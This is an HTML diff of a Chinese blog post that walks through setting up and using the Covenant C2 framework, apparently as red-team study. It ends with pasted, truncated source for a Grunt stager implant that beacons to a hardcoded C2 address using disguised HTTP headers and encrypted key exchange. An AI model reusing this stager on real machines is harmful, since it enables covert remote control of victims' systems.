@@ -1,0 +1,1925 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="开源C2:Covenant学习, 每天都要努力哇">
+    <meta name="description" content="分享者才是学习中最大的受益者！">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>开源C2:Covenant学习 | 每天都要努力哇</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="每天都要努力哇" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">每天都要努力哇</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">每天都要努力哇</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Redamancy404/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Redamancy404/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">开源C2:Covenant学习</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%BC%80%E6%BA%90C2-Covenant%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">开源C2:Covenant学习</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/C2%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                C2学习
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-10-28
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.4k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    17 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Covenant"><a href="#Covenant" class="headerlink" title="Covenant"></a>Covenant</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>C2技术在红蓝对抗种，重要性不言而喻，现在师傅们热衷于CobaltStrike，它确实是一个不错的C2。</p>
+<p>但是因为一些付费等等方面的原因，使用起来也不是很方便。</p>
+<p>今天学习一下Covenant，一款源码级别的 Csharp C2，向师傅们致敬！</p>
+<p>抱着学习的态度 写的就啰嗦了一点，望师傅们见谅！</p>
+<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>1.它是基于Windows系统，开发语言是Csharp，属于微软的东西</p>
+<p>2.DotNet版本要求 &gt; 3.5，使用Windows .NET的好处是：它支持静默安装</p>
+<p>命令</p>
+<pre class="line-numbers language-none"><code class="language-none">dotNetFx40_Full_x86_x64.exe /q /norestart /ChainingPackageFullX64Bootstrapper
+
+/q静默安装
+
+/norestart 不要重启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>3.可扩展性特别强，因为它本身提供了很多API接口 和 自定义功能</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Covenant它也分本地安装和docker安装(推荐后者)</p>
+<p>具体可以看这里：<a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup">https://github.com/cobbr/Covenant/wiki/Installation-And-Startup</a></p>
+<p>以docker安装作为演示</p>
+<p>注：需要科学上网</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt install proxychains4
+sudo apt install vim
+sudo vim /etc/proxychains4.conf
+
+proxychains git clone --recurse-submodules https://github.com/cobbr/Covenant
+cd Covenant/Covenant
+sudo docker build -t covenant .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911617.png" alt="image-20211116143606279"></p>
+<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><pre class="line-numbers language-none"><code class="language-none">sudo docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /home/dayu/Covenant/Covenant/Data:/app/Data covenant
+
+-it参数:Docker参数，在交互式tty中开始Covenant，如果不想附加到tty，可以将其排除
+
+-p参数:将端口公开到Covenant Docker容器。这个是必须将公开端口7443和要启动侦听器的任何其他端口。
+
+-v参数:在主机和容器之间创建一个共享的数据目录
+要指定数据目录的绝对路径，不能使用相对路径
+注:一定要把Covenant映射到Docker镜像里面对应的目录，如果没有的话，就跑不起来，因为所有的功能模块都在Data目录里面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注：移除所有Covenant数据并进行初始化恢复</p>
+<p>执行命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">docker rm covenant docker run -it -p 7443:7443 -p 80:80 -p 443:443 --namecovenant -v :/app/Data covenant--username AdminUser --computername 0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911619.png" alt="image-20211116144504740"></p>
+<p>报错 80端口被占用</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911620.png" alt="image-20211116152808788"></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo netstat -nultp
+
+sudo service apache2 stop
+#关闭Apache2服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911621.png" alt="image-20211116152843034"></p>
+<p>重新启动一下</p>
+<p>这次指定一下本地的 IP</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker run -d -p 127.0.0.1:7443:7443 -p 80:80 -p 443:443 --name covenant -v /home/dayu/Covenant/Covenant/Data:/app/Data covenant<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911622.png" alt="image-20211116154050851"></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker ps -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911623.png" alt="image-20211116154111984"></p>
+<h2 id="docker命令小合集"><a href="#docker命令小合集" class="headerlink" title="docker命令小合集"></a>docker命令小合集</h2><pre class="line-numbers language-none"><code class="language-none">docker images      列出所有镜像
+docker rmi -f id   删除镜像id
+
+docker ps          列出所有容器
+docker ps -a       查看曾经运行的容器
+docker rm -f id    删除容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>访问</p>
+<pre class="line-numbers language-none"><code class="language-none">https://127.0.0.1:7443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>刚开始 会让我们 注册一个用户</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911624.png" alt="image-20211116154419034"></p>
+<p>成功登录</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911625.png" alt="image-20211116154605379"></p>
+<h2 id="实操使用"><a href="#实操使用" class="headerlink" title="实操使用"></a>实操使用</h2><h3 id="Listeners"><a href="#Listeners" class="headerlink" title="Listeners"></a>Listeners</h3><h4 id="创建监听"><a href="#创建监听" class="headerlink" title="创建监听"></a>创建监听</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911626.png" alt="image-20211116154638067"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911627.png" alt="image-20211116155132074"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911628.png" alt="image-20211116155227117"></p>
+<p>注：这里HttpProfile 我选择的是：DefaultHttpProfile</p>
+<p>创建完成</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911629.png" alt="image-20211116172121285"></p>
+<p>默认的HttpProfile</p>
+<p>可以看到有四个</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911630.png" alt="image-20211116155359092"></p>
+<p>可以打开新页(open Link in new Tab)去看一下</p>
+<h4 id="DefaultHttpProfile"><a href="#DefaultHttpProfile" class="headerlink" title="DefaultHttpProfile"></a>DefaultHttpProfile</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911631.png" alt="image-20211116155958543"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911632.png" alt="image-20211116160228862"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911633.png" alt="image-20211116160650459"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911634.png" alt="image-20211116160831693"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911635.png" alt="image-20211116160923536"></p>
+<h4 id="CustomHttpProfile"><a href="#CustomHttpProfile" class="headerlink" title="CustomHttpProfile"></a>CustomHttpProfile</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911636.png" alt="image-20211116161132509"></p>
+<p>下面基本是一样的</p>
+<h4 id="TCPBridgeProfile"><a href="#TCPBridgeProfile" class="headerlink" title="TCPBridgeProfile"></a>TCPBridgeProfile</h4><p>具体写法可以参考这里：<a target="_blank" rel="noopener" href="https://github.com/cobbr/C2Bridge">https://github.com/cobbr/C2Bridge</a></p>
+<p>相当于一个模板</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911637.png" alt="image-20211116201203590"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911638.png" alt="image-20211116201228257"></p>
+<h3 id="Launchers"><a href="#Launchers" class="headerlink" title="Launchers"></a>Launchers</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911639.png" alt="image-20211116171330129"></p>
+<p>注：这10个生成方式 现在都是被杀软拦截的</p>
+<p>以Binary为例</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911640.png" alt="image-20211116171603383"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911641.png" alt="image-20211116171754263"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911642.png" alt="image-20211116171907191"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911643.png" alt="image-20211116172623966"></p>
+<h3 id="Templates"><a href="#Templates" class="headerlink" title="Templates"></a>Templates</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911644.png" alt="image-20211116173001083"></p>
+<h3 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h3><p>注：本地测试学习 杀软就关掉了</p>
+<h3 id="Grunts"><a href="#Grunts" class="headerlink" title="Grunts"></a>Grunts</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911645.png" alt="image-20211116172859334"></p>
+<p>上线之后呢</p>
+<p>会有一个提示</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911646.png" alt="image-20211116191256608"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911647.png" alt="image-20211116191415887"></p>
+<p>点一下 Name 即可进入交互界面</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911648.png" alt="image-20211116191533576"></p>
+<p>下面这些 都是可以修改的</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911649.png" alt="image-20211116191605612"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911650.png" alt="image-20211116191703103"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911651.png" alt="image-20211116192418284"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911652.png" alt="image-20211116191807909"></p>
+<p>默认有很多默认的 可以执行的任务</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911653.png" alt="image-20211116191848773"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911654.png" alt="image-20211116192453186"></p>
+<h3 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911655.png" alt="image-20211116192908958"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911656.png" alt="image-20211116192932611"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911657.png" alt="image-20211116193020620"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911658.png" alt="image-20211116193139007"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911659.png" alt="image-20211116193216188"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911660.png" alt="image-20211116193259524"></p>
+<h3 id="Taskings"><a href="#Taskings" class="headerlink" title="Taskings"></a>Taskings</h3><p>历史执行过的命令</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911661.png" alt="image-20211116193505600"></p>
+<h3 id="Graph"><a href="#Graph" class="headerlink" title="Graph"></a>Graph</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911662.png" alt="image-20211116193551833"></p>
+<h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><p>实际获取到的内容</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911663.png" alt="image-20211116193718881"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911664.png" alt="image-20211116193918449"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911665.png" alt="image-20211116194034104"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911666.png" alt="image-20211116194056475"></p>
+<h3 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911667.png" alt="image-20211116192710648"></p>
+<p><a target="_blank" rel="noopener" href="https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html">https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html</a></p>
+<p>这里是会弹一个MessageBox提示窗口</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911668.png" alt="image-20211116231735243"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911669.png" alt="image-20211116232230639"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911670.png" alt="image-20211116232752194"></p>
+<pre class="line-numbers language-none"><code class="language-none">1:判断传入的dllstring不为空
+
+2:一个循环 将传入的dll按`,`分隔
+
+3:循环添加refdll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911671.png" alt="image-20211116234124628"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911672.png" alt="image-20211116233150225"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911673.png" alt="image-20211116233331348"></p>
+<p>继续</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911674.png" alt="image-20211116233827330"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911675.png" alt="image-20211116234308557"></p>
+<p>重新生成解决方案</p>
+<p>继续</p>
+<p>把Covenant的Binary Launcher的Code源码 扒过来</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911676.png" alt="image-20211117170624875"></p>
+<p>这里贴一下 方便一些</p>
+<pre class="line-numbers language-none"><code class="language-none">using System;
+using System.Net;
+using System.Linq;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.IO.Pipes;
+using System.Reflection;
+using System.Collections.Generic;
+using System.Security.Cryptography;
+
+namespace GruntStager
+{
+    public class GruntStager
+    {
+        public GruntStager()
+        {
+            ExecuteStager();
+        }
+        [STAThread]
+        public static void Main(string[] args)
+        {
+            new GruntStager();
+        }
+        public static void Execute()
+        {
+            new GruntStager();
+        }
+        public void ExecuteStager()
+        {
+            try
+            {
+                List&lt;string&gt; CovenantURIs = @"http://192.168.175.209:80".Split(',').ToList();
+                string CovenantCertHash = @"";
+				List&lt;string&gt; ProfileHttpHeaderNames = @"VXNlci1BZ2VudA==,Q29va2ll".Split(',').ToList().Select(H =&gt; System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+				List&lt;string&gt; ProfileHttpHeaderValues = @"TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==,QVNQU0VTU0lPTklEPXtHVUlEfTsgU0VTU0lPTklEPTE1NTIzMzI5NzE3NTA=".Split(',').ToList().Select(H =&gt; System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+				List&lt;string&gt; ProfileHttpUrls = @"L2VuLXVzL2luZGV4Lmh0bWw=,L2VuLXVzL2RvY3MuaHRtbA==,L2VuLXVzL3Rlc3QuaHRtbA==".Split(',').ToList().Select(U =&gt; System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+				string ProfileHttpPostRequest = @"i=a19ea23062db990386a3a478cb89d52e&amp;data={0}&amp;session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
+                string ProfileHttpPostResponse = @"&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Hello World!&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;Hello World!&lt;/p&gt;
+        // Hello World! {0}
+    &lt;/body&gt;
+&lt;/html&gt;".Replace(Environment.NewLine, "\n");
+                bool ValidateCert = bool.Parse(@"false");
+                bool UseCertPinning = bool.Parse(@"false");
+
+                Random random = new Random();
+                string aGUID = @"518387fa18";
+                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
+                byte[] SetupKeyBytes = Convert.FromBase64String(@"rrONV/NTSPl4sU0FVzoK1TxidURN/ORaK0Yh6sMzG24=");
+                string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
+
+                Aes SetupAESKey = Aes.Create();
+                SetupAESKey.Mode = CipherMode.CBC;
+                SetupAESKey.Padding = PaddingMode.PKCS7;
+                SetupAESKey.Key = SetupKeyBytes;
+                SetupAESKey.GenerateIV();
+                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
+                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());
+
+                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
+                byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
